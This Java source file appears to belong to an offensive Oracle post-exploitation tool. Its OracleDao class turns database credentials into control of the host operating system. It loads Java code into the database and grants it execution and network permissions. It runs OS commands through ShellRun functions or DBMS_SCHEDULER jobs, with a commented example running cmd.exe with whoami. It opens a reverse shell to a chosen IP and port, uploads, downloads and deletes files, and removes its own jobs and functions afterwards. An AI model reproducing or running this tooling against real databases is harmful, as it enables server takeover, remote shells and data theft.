package Dao;

import Controller.OracleController;
import Entity.ControllersFactory;
import Util.MessageUtil;
import Util.OracleSqlUtil;
import Util.Utils;
import Util.YamlConfigs;
import javafx.application.Platform;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.*;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Locale;
import java.util.Map;

import static Util.Utils.splitDisk;
import static Util.Utils.splitFiles;


/**
 * @author ch1ng
 */
public class OracleDao {

    private String JARFILE;
    private String JDBCURL;
    private  String DRIVER;
    private String USERNAME;
    private String PASSWORD;
    private Connection CONN = null;
    private URLClassLoader URLCLASSLOADER;
    private Method METHOD;
    private String OS = "linux";


    /**
     * 用此方法获取 OracleController 的日志框
     */
    private OracleController oracleController = (OracleController) ControllersFactory.controllers.get(OracleController.class.getSimpleName());

    public OracleDao(String ip,String port,String database,String username,String password,String timeout) throws Exception {
        YamlConfigs configs = new YamlConfigs();
        Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
        // 从配置文件读取变量
        JARFILE = (String) configs.getValue("Oracle.Driver",yamlToMap);
        JDBCURL = (String) configs.getValue("Oracle.JDBCUrl",yamlToMap);
        DRIVER = (String) configs.getValue("Oracle.ClassName",yamlToMap);
        // 进行时间转换
        timeout = String.valueOf(Integer.parseInt(timeout) * 1000);
        JDBCURL = MessageFormat.format(JDBCURL,ip,port,database);
        USERNAME = username;
        PASSWORD = password;
        System.setProperty("oracle.jdbc.ReadTimeout",timeout);
        System.setProperty("oracle.net.CONNECT_TIMEOUT",timeout);
        // 动态加载
        URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
        METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        METHOD.setAccessible(true);
        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
        URL url = (new File(JARFILE)).toURI().toURL();
        METHOD.invoke(URLCLASSLOADER, url);
        Class.forName(DRIVER);

    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     * @return
     * @throws java.sql.SQLException
     */
    public void testConnection() throws Exception {
        if (CONN == null || CONN.isClosed()) {
            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
            Utils.regroupDrivers("oracle");
            DriverManager.getConnection(JDBCURL,USERNAME,PASSWORD);
            closeConnection();
        }

    }

    public Connection getConnection() throws SQLException {
        if (CONN == null || CONN.isClosed()) {
            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
            Utils.regroupDrivers("oracle");
            CONN = DriverManager.getConnection(JDBCURL,USERNAME,PASSWORD);
        }
        return CONN;
    }

    public void closeConnection() throws java.sql.SQLException {
        if (CONN != null) {
            CONN.close();
        }
    }


    /**
     * 本类调用的执行 SQL 函数
     * @param sql
     * @return
     * @throws Exception
     */
    public String executeSql(String sql) throws Exception {
        StringBuffer res = new StringBuffer();
        // 使用Connection来创建一个Statement对象
        Statement stmt = CONN.createStatement();
        // 执行SQL,返回boolean值表示是否包含ResultSet
        boolean hasResultSet = stmt.execute(sql);
        // 如果执行后有ResultSet结果集
        if (hasResultSet) {
            // 获取结果集
            ResultSet rs = stmt.getResultSet();
            // ResultSetMetaData是用于分析结果集的元数据接口
            ResultSetMetaData rsmd = rs.getMetaData();
            int columnCount = rsmd.getColumnCount();
            // 迭代输出ResultSet对象
            while (rs.next())
            {
                // 依次输出每列的值
                for (int i = 0 ; i < columnCount ; i++ )
                {
                    String temp = rs.getString(i+1)+ "\n";
                    res.append(temp);
                }
            }
        } else {
            res.append(stmt.getUpdateCount());
        }
        return res.toString();
    }

    /**
     * 获取当前版本号
     */
    public void getVersion(){
        try {
            String selectfile = OracleSqlUtil.getVersionSql;
            String version = executeSql(selectfile);
            //不等于 -1 就是找到了windows关键字
            if(version.toLowerCase().contains("windows")){
                OS = "windows";
            }
            oracleController.oracleLogTextArea.appendText(Utils.log("当前数据库版本:\n" + version));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 判断当前账号是否为 DBA 账号
     */
    public void isDBA() {
        try {
            String sqlstring = OracleSqlUtil.isDBASql;
            String dbares = executeSql(sqlstring);
            if("TRUE".equals(dbares.replace("\n",""))){
                oracleController.oracleLogTextArea.appendText(Utils.log("当前账号是 DBA 权限"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("当前账号不是 DBA 权限"));
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * scheduler 执行命令
     * @param commnads
     * @throws SQLException
     * @throws InterruptedException
     */
    public void schedulerCmd(String commnads) {
//        BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'Jo2441',job_type=>'EXECUTABLE',number_of_arguments=>2,job_action =>'C:/Winodws/System32/cmd.exe',auto_drop=>FALSE);END;
//        BEGIN DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1228',1,'2');END;
//        BEGIN DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('J1228',2,'whoami > C:\1.txt');END;
//        BEGIN DBMS_SCHEDULER.ENABLE('J1228');END;
//        select log_id, log_date, job_name, status, error#, additional_info from dba_scheduler_job_run_details where job_name ='J1228';
        try {
            String job_action = "";
            String[] cmds = commnads.split(" ");
            // 如果第一个参数存在 cmd 参数则采用 cmd /c 方式执行命令
            // 暂时废弃 自行补全 windows下一定要 '\' 不然会出错
//            if(cmds[0].contains("cmd")){
//                cmds[0] = "C:\\Windows\\System32\\cmd.exe";
//            }
            String randomJobName = "JOB_"+Utils.getRandomString().toUpperCase(Locale.ROOT);
            String CREATE_JOBSql = OracleSqlUtil.CREATE_JOBSql;
            String SET_JOB_ARGUMENT_VALUESql = OracleSqlUtil.SET_JOB_ARGUMENT_VALUESql;
            String ENABLESql = OracleSqlUtil.ENABLESql;
            // 拼接
            CREATE_JOBSql = String.format(CREATE_JOBSql,randomJobName,cmds.length - 1,cmds[0]);
            executeSql(CREATE_JOBSql);
            for(int i = 0; i < cmds.length; i++) {
                if(i !=0){
                    String tmpStr = String.format(SET_JOB_ARGUMENT_VALUESql,randomJobName,i,cmds[i]);
                    executeSql(tmpStr);
                }
            }
            // 执行当前任务
            executeSql(String.format(ENABLESql,randomJobName));
            oracleController.oracleLogTextArea.appendText(Utils.log("正在获取 "+ randomJobName +" 任务状态...请稍等"));
            // 获取任务状态
            getJobStatus(randomJobName);
            oracleController.oracleLogTextArea.appendText(Utils.log("获取 " + randomJobName +" 任务状态成功！"));
            // 删除任务
            deleteJob(randomJobName,"True","False");
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 删除已经运行完的 job
     * @param jobname
     */
    public void deleteJob(String jobname,String force,String defer) {
        try {
            String checkSql = String.format(OracleSqlUtil.checkJobSql,jobname);
            String realJobName = executeSql(checkSql).replace("\n","");
            if("".equals(realJobName)){
                oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务不存在！"));
                return;
            }
            String sql = OracleSqlUtil.deleteJobSql;
            sql = String.format(sql,jobname,force,defer);
            executeSql(sql);
            oracleController.oracleLogTextArea.appendText(Utils.log(jobname +" 任务删除成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 获取任务状态
     * @param jobname
     * @throws SQLException
     * @throws InterruptedException
     */
    public void getJobStatus(String jobname) throws SQLException, InterruptedException {
        // 延时 10s 之后才获取任务状态
        Thread.sleep(5000);
        String sql = String.format(OracleSqlUtil.getJobStatusSql,jobname);
        String additional_info = "";
        String status = "";
        // 使用Connection来创建一个Statement对象
        Statement stmt = CONN.createStatement();
        // 执行SQL,返回boolean值表示是否包含ResultSet
        boolean hasResultSet = stmt.execute(sql);
        // 如果执行后有ResultSet结果集
        if (hasResultSet) {
            // 获取结果集
            ResultSet rs = stmt.getResultSet();
            // 迭代输出ResultSet对象
            while (rs.next())
            {
                status = rs.getString("status");
                additional_info = rs.getString("additional_info");
            }
            if("FAILED".equals(status)){
                oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务执行失败！"));
                oracleController.Textarea_OracleCommandResult.setText(additional_info);
            }else if("".equals(status)){
                oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务正在进行..."));
                //getJobStatus(jobname);
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log(jobname + " 任务执行完成！"));
            }
        }
    }

    /**
     * 初始化 ShellUtilJAVA 代码
     */
    public void importShellUtilJAVA(){
        try {
            String CREATE_SOURCE = OracleSqlUtil.ShellUtilCREATE_SOURCESql;
            String GRANT_JAVA_EXEC = OracleSqlUtil.ShellUtilGRANT_JAVA_EXECSql;
            // 赋予命令执行权限
            String GRANT_JAVA_EXEC2 = OracleSqlUtil.ShellUtilGRANT_JAVA_EXEC2Sql;
            // 赋予网络连接允许权限
            // 参考 https://docs.oracle.com/javase/8/docs/technotes/guides/security/spec/security-spec.doc3.html
            String GRANT_JAVA_EXEC3 = OracleSqlUtil.ShellUtilGRANT_JAVA_EXEC3Sql;
            String CREATE_FUNCTION = OracleSqlUtil.ShellUtilCREATE_FUNCTIONSql;

            // 获取插件目录
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Oracle" + File.separator + "ShellUtil.java";
            // 读取插件内容
            String SHELLUTILSOURCE = Utils.readFile(path);
            CREATE_SOURCE = String.format(CREATE_SOURCE, SHELLUTILSOURCE);
            executeSql(CREATE_SOURCE);
            oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
            executeSql(GRANT_JAVA_EXEC);
            executeSql(GRANT_JAVA_EXEC2);
            executeSql(GRANT_JAVA_EXEC3);
            oracleController.oracleLogTextArea.appendText(Utils.log("赋权成功！"));
            executeSql(CREATE_FUNCTION);
            oracleController.oracleLogTextArea.appendText(Utils.log("创建 ShellRun 函数成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 初始化 FileUtilJAVA 代码
     */
    public void importFileUtilJAVA(){
        try {
            String CREATE_SOURCE = OracleSqlUtil.FileUtilCREATE_SOURCESql;
            String GRANT_JAVA_EXEC = OracleSqlUtil.FileUtilGRANT_JAVA_EXECSql;
            // 赋予文件操作属性权限
            // 参考 https://docs.oracle.com/javase/8/docs/technotes/guides/security/spec/security-spec.doc3.html
            String GRANT_JAVA_EXEC1 = OracleSqlUtil.FileUtilGRANT_JAVA_EXEC1Sql;
            String CREATE_FUNCTION = OracleSqlUtil.FileUtilCREATE_FUNCTIONSql;
            // 获取插件目录
            String path =
                    Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Oracle" + File.separator + "FileUtil.java";
            // 读取插件内容
            String FILEUTILSOURCE = Utils.readFile(path);
            CREATE_SOURCE = String.format(CREATE_SOURCE, FILEUTILSOURCE);
            executeSql(CREATE_SOURCE);
            oracleController.oracleLogTextArea.appendText(Utils.log("导入 JAVA 代码成功！"));
            executeSql(GRANT_JAVA_EXEC);
            executeSql(GRANT_JAVA_EXEC1);
            oracleController.oracleLogTextArea.appendText(Utils.log("赋权成功！"));
            executeSql(CREATE_FUNCTION);
            oracleController.oracleLogTextArea.appendText(Utils.log("创建 FileRun 函数成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }



    /**
     * 执行系统命令
     * @param command 要执行的命令
     * @param code 编码
     * @param type 执行类型 java or scheduler
     */
    public String executeCommand(String command,String code,String type){
        String res = "";
        try {
            switch (type){
                case "java":
                    String cmdSqlString = OracleSqlUtil.shellRunSql;
                    res = executeSql(String.format(cmdSqlString,command,code));
                    oracleController.oracleLogTextArea.appendText(Utils.log("执行命令成功！"));
                    break;
                case "scheduler":
                    schedulerCmd(command);
                    break;
                default:
                    break;
            }
        }catch (Exception e){
            oracleController.oracleLogTextArea.appendText(Utils.log("执行命令失败！"));
            String r = e.getMessage();
            if(r.contains("ORA-00904")){
                oracleController.oracleLogTextArea.appendText(Utils.log("请先初始化方法！"));
            }else if(r.contains("ORA-27486")){
                oracleController.oracleLogTextArea.appendText(Utils.log("当前账号权限不足！无法执行！"));
            } else {
                Platform.runLater(() ->{
                    MessageUtil.showExceptionMessage(e,e.getMessage());
                });
            }
        }
        return res;
    }

    /**
     * 删除 ShellUtil 函数
     */
    public void deleteShellFunction(){
        String res = "";
        try {
            String checkSql = OracleSqlUtil.checkShellFunctionSql;
            String dropJAVASql = OracleSqlUtil.deleteShellJAVASOURCESql;
            String dropFuncSql = OracleSqlUtil.deleteShellFunctionSql;
            res = executeSql(checkSql).replace("\n","");
            // 不等于空就说明存在 shellrun 函数
            if(!"".equals(res)){
                executeSql(dropFuncSql);
                executeSql(dropJAVASql);
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数成功！"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 SHELLRUN 函数失败！函数可能不存在！"));
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 删除 FileUtil 函数
     */
    public void deleteFileFunction(){
        String res = "";
        try {
            String checkSql = OracleSqlUtil.checkFileFunctionSql;
            String dropJAVASql = OracleSqlUtil.deleteFileJAVASOURCESql;
            String dropFuncSql = OracleSqlUtil.deleteFileFunctionSql;
            res = executeSql(checkSql).replace("\n","");
            // 不等于空就说明存在 shellrun 函数
            if(!"".equals(res)){
                executeSql(dropFuncSql);
                executeSql(dropJAVASql);
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数成功！"));
            }else {
                oracleController.oracleLogTextArea.appendText(Utils.log("删除 FILERUN 函数失败！"));
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * java 反弹shell
     * @param ip
     * @param port
     */
    public void reverseJavaShell(String ip,String port){
        String sqlstring1 = OracleSqlUtil.checkReverseJavaShellSql;
        try {
            String res1 = executeSql(sqlstring1).replace("\n","");
            if("".equals(res1)){
                oracleController.oracleLogTextArea.appendText(Utils.log("SHELLRUN 函数不存在！，请先创建函数！"));
            }else {
                executeSql(String.format(OracleSqlUtil.reverseJavaShellSql,ip,port));
                oracleController.oracleLogTextArea.appendText(Utils.log("反弹 Shell 成功！"));
            }
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }


    /**
     * 获取所有盘符
     * @return
     */
    public ArrayList<String> getDisk(){
        String tempres = "";
        ArrayList<String> res = new ArrayList<String>();
        String sql = OracleSqlUtil.getDiskSql;
        try {
            tempres = executeSql(sql);
            res = splitDisk(tempres);
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }


    /**
     * 获取路径下所有的文件夹和文件名
     * @param path
     * @param code
     * @return
     */
    public ArrayList<String> getFiles(String path,String code){
        ArrayList<String> res = new ArrayList<String>();
        if (code == null || code.equals("")) {
            code = "UTF-8";
        }
        String tempres = "";
        String sql = String.format(OracleSqlUtil.getFilesSql,path,code);
        try {
            tempres = executeSql(sql);
            if(tempres.contains("ERROR://")){
                oracleController.oracleLogTextArea.appendText(Utils.log("获取所有文件失败！错误："+ tempres.replace("ERROR://","")));
                return res;
            }
            res = splitFiles(tempres);
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }

    /**
     * 上传文件
     * @param path
     * @param contexts
     */
    public void upload(String path,String contexts){
        String sql = OracleSqlUtil.uploadSql;
        try {
            sql = String.format(sql,path,contexts);
            String res = executeSql(sql);
            if(res.startsWith("ok")){
                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件成功！"));
            }else {
                Platform.runLater(() ->{
                    MessageUtil.showErrorMessage(res);
                });
                oracleController.oracleLogTextArea.appendText(Utils.log("上传文件失败！"));
            }
            //PublicUtil.log("上传文件成功！");
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
            //PublicUtil.log(throwables.getMessage());
        }
    }

    /**
     * 下载文件
     * @param path
     * @return
     */
    public String download(String path){
        String sql = OracleSqlUtil.downloadSql;
        String res = "";
        try {
            sql = String.format(sql,path);
            res = executeSql(sql);
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }

    /**
     * 删除文件
     * @param path
     * @return
     */
    public String delete(String path){
        String sql = OracleSqlUtil.deleteSql;
        String res = "";
        try {
            sql = String.format(sql,path);
            res = executeSql(sql);
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }
}